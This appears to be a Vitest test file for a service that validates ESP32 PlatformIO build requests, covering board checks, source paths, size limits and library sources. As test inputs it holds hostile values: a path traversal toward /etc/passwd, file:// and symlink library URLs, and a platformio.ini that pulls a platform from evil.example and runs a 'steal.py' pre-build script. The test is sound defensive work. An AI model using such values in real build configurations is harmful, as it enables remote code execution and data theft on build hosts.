import { describe, it, expect } from 'vitest';
import { validateRequest, readUserIni, buildIni, MAX_SOURCE_BYTES } from '../../lib/validate';
import { BLINK } from '../sketches';

describe('validateRequest', () => {
  it('accepts a blink sketch and defaults the board', () => {
    const r = validateRequest({ files: { 'src/main.cpp': BLINK } });
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.value).toEqual({ board: 'esp32dev', files: { 'src/main.cpp': BLINK }, libDeps: [] });
  });
  it('rejects unsupported boards', () => {
    expect(validateRequest({ board: 'esp32-s3-devkitc-1', files: { 'src/main.cpp': BLINK } }).ok).toBe(false);
  });
  it('rejects paths outside src/ and path traversal', () => {
    for (const p of ['main.cpp', 'src/../../etc/passwd.h', '/src/main.cpp', 'src/main.py', 'extra_script.py']) {
      expect(validateRequest({ files: { [p]: 'x', 'src/main.cpp': BLINK } }).ok, p).toBe(false);
    }
  });
  it('needs at least one source file', () => {
    expect(validateRequest({ files: { 'platformio.ini': '[env:esp32dev]' } }).ok).toBe(false);
  });
  it('caps the total source size', () => {
    expect(validateRequest({ files: { 'src/main.cpp': 'x'.repeat(MAX_SOURCE_BYTES + 1) } }).ok).toBe(false);
  });
  it('only allows registry libraries', () => {
    expect(validateRequest({ files: { 'src/main.cpp': BLINK }, libDeps: ['adafruit/Adafruit NeoPixel@^1.12'] }).ok).toBe(true);
    for (const bad of ['https://github.com/x/y.git', 'file:///etc', 'symlink://..', 'x']) {
      expect(validateRequest({ files: { 'src/main.cpp': BLINK }, libDeps: [bad] }).ok, bad).toBe(false);
    }
  });
});

describe('platformio.ini handling', () => {
  it('ignores dangerous options and keeps lib_deps + monitor_speed', () => {
    const ini = `[env:esp32dev]
platform = https://evil.example/platform.zip
extra_scripts = pre:steal.py
monitor_speed = 9600
lib_deps =
    adafruit/Adafruit NeoPixel@^1.12
    https://github.com/evil/lib.git
build_flags = -DX`;
    expect(readUserIni(ini)).toEqual({ libDeps: ['adafruit/Adafruit NeoPixel@^1.12'], monitorSpeed: 9600 });
  });
  it('builds a clean ini for esp32dev', () => {
    const ini = buildIni('esp32dev', ['adafruit/Adafruit NeoPixel@^1.12']);
    expect(ini).toContain('[env:esp32dev]');
    expect(ini).toContain('platform = espressif32');
    expect(ini).toContain('framework = arduino');
    expect(ini).toContain('    adafruit/Adafruit NeoPixel@^1.12');
    expect(ini).not.toContain('extra_scripts');
  });
});
